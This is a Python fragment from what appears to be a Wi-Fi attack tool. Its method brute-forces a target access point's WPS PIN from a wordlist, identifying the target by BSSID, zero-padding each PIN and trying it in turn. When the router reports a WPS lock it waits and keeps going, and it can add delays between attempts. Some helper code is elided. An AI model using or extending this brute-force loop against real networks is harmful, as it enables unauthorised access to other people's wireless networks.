...
class Initialize:
    ...
    def wordlistAttack(self, bssid: str, wordlist_path: str):
        """Attempts to connect using PINs from a wordlist file."""
        ...
        logger.info(f'Starting wordlist attack on {bssid} with {len(pins)} PINs')
        
        for pin in pins:
            if not src.utils.isInterfaceUp(self.CONNECTION.INTERFACE):
                logger.error(f'Interface {self.CONNECTION.INTERFACE} is no longer UP. Aborting.')
                return False

            # Basic PIN validation (8 digits or less)
            clean_pin = pin.zfill(8)
            if self.CONNECTION.singleConnection(bssid, clean_pin):
                return True

            if self.CONNECTION.CONNECTION_STATUS.IS_LOCKED:
                logger.warning(f'{bssid} is WPS LOCKED. Waiting {args.timeout}s...')
                time.sleep(args.timeout)

            if args.delay:
                time.sleep(args.delay)

        logger.warning('PIN not found in wordlist.')
        return False
